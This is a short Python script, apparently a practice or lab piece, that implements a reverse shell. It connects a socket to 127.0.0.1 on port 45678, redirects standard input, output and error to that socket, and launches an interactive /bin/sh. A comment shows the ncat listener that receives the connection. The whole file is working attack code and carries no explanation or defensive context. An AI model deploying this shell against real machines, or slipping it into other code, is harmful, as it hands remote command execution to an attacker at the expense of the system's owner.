#!/usr/bin/python

#ncat -l -v -p 45678

import socket
import subprocess
import os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 45678))
sock.send(b'[*] Connection Established') 
os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)
shell_remote = subprocess.call(["/bin/sh", "-i"])
proc = subprocess.call(["/bin/ls", "-i"])
